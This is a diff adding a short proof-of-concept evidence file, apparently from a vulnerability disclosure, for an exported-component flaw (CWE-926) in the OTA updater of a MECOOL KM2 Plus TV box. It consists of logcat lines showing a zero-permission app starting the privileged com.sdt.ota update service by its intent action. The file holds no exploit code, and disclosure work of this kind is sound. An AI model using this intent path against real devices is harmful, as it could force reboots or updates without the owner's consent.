@@ -1,0 +1,13 @@
+# CWE-926 PoC — MECOOL KM2 Plus (firmware C1.2.7_20250822), 2026-11-24
+# Key lines extracted from logcat_chain_complete.txt (verbatim; WindowManager dumps and
+# harmless ziparchive 'base.dm' warnings removed). PoC app = com.poc.cwe926.bootservice, UID 10014,
+# zero declared permissions. Target = com.sdt.ota, UID 10094 (RECOVERY/REBOOT/INSTALL_PACKAGE_UPDATES).
+
+11-24 12:23:27.936  7992  8037 D ProfileInstaller: Installing profile for com.sdt.ota
+11-24 12:23:32.483   753  1707 I ActivityManager: Background started FGS: Allowed [callingPackage: com.sdt.ota; callingUid: 10094; uidState: TOP ; uidBFSL: [BFSL]; intent: Intent { act=com.skw.ota.update.CoreService pkg=com.sdt.ota (has extras) }; code:PROC_STATE_TOP; tempAllowListReason:<fg-service-launch,reasonCode:SERVICE_LAUNCH,duration:30000,callingUid:10014>; targetSdkVersion:34; callerTargetSdkVersion:34; startForegroundCount:0; bindFromPackage:null: isBindService:false]
+11-24 12:23:32.498  1017  1044 V WindowManagerShell: Transition requested: ... realActivity=ComponentInfo{com.sdt.ota/com.sdt.ota.common.dialog.SysBootupDialog} ... A=10094:com.sdt.ota
+11-24 12:23:32.506  7992  7992 I SdtSysUpdate: CoreService onCreate
+11-24 12:23:32.506  7992  7992 I SdtAppUpdate: CoreService onCreate
+11-24 12:23:32.507  7992  7992 I SdtSysUpdate: CoreService onStartCommand
+11-24 12:23:32.507  7992  7992 I SdtAppUpdate: CoreService onStartCommand
+11-24 12:23:32.609   753  1703 D CoreBackPreview: Window{548a526 u0 com.sdt.ota/com.sdt.ota.common.dialog.SysBootupDialog}: Setting back callback null
